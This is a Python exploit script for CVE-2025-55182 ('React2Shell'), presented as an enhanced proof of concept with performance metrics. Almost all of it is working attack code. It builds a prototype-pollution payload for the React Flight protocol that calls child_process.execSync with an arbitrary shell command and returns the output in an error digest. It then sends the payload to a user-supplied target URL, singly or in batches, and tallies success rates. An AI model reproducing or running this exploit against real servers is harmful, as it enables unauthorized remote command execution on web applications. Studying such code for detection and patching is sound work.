#!/usr/bin/env python3
"""
Enhanced PoC for CVE-2025-55182 (React2Shell) with Performance Metrics
This version collects detailed metrics for security research and impact analysis
"""

import requests
import sys
import json
import time
import statistics
from typing import Dict, List, Tuple
from dataclasses import dataclass, asdict

@dataclass
class ExploitMetrics:
    """Metrics collected from exploit execution"""
    request_size_bytes: int
    response_time_ms: float
    status_code: int
    success: bool
    error_message: str = ""
    timestamp: float = 0.0

class React2ShellPoC:
    def __init__(self, base_url: str, command: str = "id"):
        self.base_url = base_url
        self.command = command
        self.metrics_log: List[ExploitMetrics] = []

    def craft_payload(self, command_override: str = None) -> Tuple[Dict, Dict]:
        """
        Craft the malicious payload exploiting React Flight Protocol
        Returns: (files dict, headers dict)
        """
        cmd = command_override if command_override else self.command

        crafted_chunk = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then": "$B0"}',
            "_response": {
                "_prefix": f"var res = process.mainModule.require('child_process').execSync('{cmd}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
                "_formData": {
                    "get": "$1:constructor:constructor",
                },
            },
        }

        files = {
            "0": (None, json.dumps(crafted_chunk)),
            "1": (None, '"$@0"'),
        }

        headers = {"Next-Action": "x"}

        return files, headers

    def execute_single(self, verbose: bool = True) -> ExploitMetrics:
        """
        Execute a single exploit attempt and collect metrics
        """
        files, headers = self.craft_payload()

        # Calculate payload size
        payload_size = sum(len(json.dumps(v)) if isinstance(v, tuple) else len(str(v))
                          for v in files.values())

        start_time = time.time()

        try:
            response = requests.post(
                self.base_url,
                files=files,
                headers=headers,
                timeout=10
            )

            end_time = time.time()
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds

            # Check if exploit succeeded by looking for command output
            success = response.status_code in [500, 200] and "NEXT_REDIRECT" in response.text

            metrics = ExploitMetrics(
                request_size_bytes=payload_size,
                response_time_ms=response_time,
                status_code=response.status_code,
                success=success,
                timestamp=start_time
            )

            if verbose:
                print(f"[+] Status: {response.status_code}")
                print(f"[+] Response time: {response_time:.2f}ms")
                print(f"[+] Payload size: {payload_size} bytes")
                print(f"[+] Success: {success}")
                if success:
                    print(f"[+] Response:\n{response.text}")

            self.metrics_log.append(metrics)
            return metrics

        except requests.exceptions.Timeout:
            end_time = time.time()
            response_time = (end_time - start_time) * 1000

            metrics = ExploitMetrics(
                request_size_bytes=payload_size,
                response_time_ms=response_time,
                status_code=0,
                success=False,
                error_message="Request timeout",
                timestamp=start_time
            )

            if verbose:
                print(f"[-] Request timed out after {response_time:.2f}ms")

            self.metrics_log.append(metrics)
            return metrics

        except Exception as e:
            metrics = ExploitMetrics(
                request_size_bytes=payload_size,
                response_time_ms=0,
                status_code=0,
                success=False,
                error_message=str(e),
                timestamp=time.time()
            )

            if verbose:
                print(f"[-] Error: {e}")

            self.metrics_log.append(metrics)
            return metrics

    def execute_batch(self, count: int, delay_ms: int = 0, verbose: bool = False) -> List[ExploitMetrics]:
        """
        Execute multiple exploit attempts for performance analysis

        Args:
            count: Number of requests to send
            delay_ms: Delay between requests in milliseconds
            verbose: Print detailed output for each request
        """
        print(f"\n[*] Executing {count} exploit attempts...")
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Command: {self.command}")

        results = []

        for i in range(count):
            if verbose or (i + 1) % 10 == 0:
                print(f"[*] Progress: {i + 1}/{count}")

            metrics = self.execute_single(verbose=verbose)
            results.append(metrics)

            if delay_ms > 0 and i < count - 1:
                time.sleep(delay_ms / 1000.0)

        return results

    def analyze_metrics(self) -> Dict:
        """
        Analyze collected metrics and return statistics
        """
        if not self.metrics_log:
            return {}

        response_times = [m.response_time_ms for m in self.metrics_log]
        successes = [m for m in self.metrics_log if m.success]
        failures = [m for m in self.metrics_log if not m.success]

        analysis = {
            "total_requests": len(self.metrics_log),
            "successful_exploits": len(successes),
            "failed_attempts": len(failures),
            "success_rate": (len(successes) / len(self.metrics_log)) * 100,
            "response_times": {
                "min_ms": min(response_times) if response_times else 0,
                "max_ms": max(response_times) if response_times else 0,
                "mean_ms": statistics.mean(response_times) if response_times else 0,
                "median_ms": statistics.median(response_times) if response_times else 0,
                "stdev_ms": statistics.stdev(response_times) if len(response_times) > 1 else 0
            },
            "payload_size_bytes": self.metrics_log[0].request_size_bytes if self.metrics_log else 0,
            "error_types": {}
        }

        # Count error types
        for failure in failures:
            error = failure.error_message or "Unknown"
            analysis["error_types"][error] = analysis["error_types"].get(error, 0) + 1

        return analysis

    def print_analysis(self):
        """
        Print formatted analysis of collected metrics
        """
        analysis = self.analyze_metrics()

        if not analysis:
            print("[-] No metrics collected")
            return

        print("\n" + "="*60)
        print(" PERFORMANCE ANALYSIS RESULTS")
        print("="*60)

        print(f"\n[*] Total Requests: {analysis['total_requests']}")
        print(f"[+] Successful Exploits: {analysis['successful_exploits']}")
        print(f"[-] Failed Attempts: {analysis['failed_attempts']}")
        print(f"[*] Success Rate: {analysis['success_rate']:.2f}%")

        print(f"\n[*] Payload Size: {analysis['payload_size_bytes']} bytes")

        rt = analysis['response_times']
        print(f"\n[*] Response Time Statistics:")
        print(f"    - Minimum: {rt['min_ms']:.2f}ms")
        print(f"    - Maximum: {rt['max_ms']:.2f}ms")
        print(f"    - Mean: {rt['mean_ms']:.2f}ms")
        print(f"    - Median: {rt['median_ms']:.2f}ms")
        print(f"    - Std Dev: {rt['stdev_ms']:.2f}ms")

        if analysis['error_types']:
            print(f"\n[*] Error Types:")
            for error, count in analysis['error_types'].items():
                print(f"    - {error}: {count}")

        print("\n" + "="*60)

    def export_metrics_json(self, filename: str = "exploit_metrics.json"):
        """
        Export collected metrics to JSON file for further analysis
        """
        import os

        # Get the directory where this script is located
        script_dir = os.path.dirname(os.path.abspath(__file__))

        # If filename is just a name (not a path), save it in the script directory
        if not os.path.dirname(filename):
            filename = os.path.join(script_dir, filename)

        data = {
            "metadata": {
                "target_url": self.base_url,
                "command": self.command,
                "total_requests": len(self.metrics_log),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            },
            "metrics": [asdict(m) for m in self.metrics_log],
            "analysis": self.analyze_metrics()
        }

        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

        print(f"[+] Metrics exported to: {filename}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_enhanced.py <target_url> [command] [--batch N] [--delay MS]")
        print("\nExamples:")
        print("  python poc_enhanced.py http://localhost:3000 whoami")
        print("  python poc_enhanced.py http://localhost:3000 id --batch 100")
        print("  python poc_enhanced.py http://localhost:3000 whoami --batch 50 --delay 100")
        sys.exit(1)

    base_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith('--') else "id"

    # Parse optional arguments
    batch_mode = False
    batch_count = 1
    delay_ms = 0

    for i, arg in enumerate(sys.argv):
        if arg == "--batch" and i + 1 < len(sys.argv):
            batch_mode = True
            batch_count = int(sys.argv[i + 1])
        elif arg == "--delay" and i + 1 < len(sys.argv):
            delay_ms = int(sys.argv[i + 1])

    # Initialize PoC
    poc = React2ShellPoC(base_url, command)

    print("="*60)
    print(" CVE-2025-55182 (React2Shell) Enhanced PoC")
    print("="*60)

    if batch_mode:
        # Batch mode for performance testing
        poc.execute_batch(batch_count, delay_ms)
        poc.print_analysis()
        poc.export_metrics_json()
    else:
        # Single execution mode
        poc.execute_single(verbose=True)


if __name__ == "__main__":
    main()
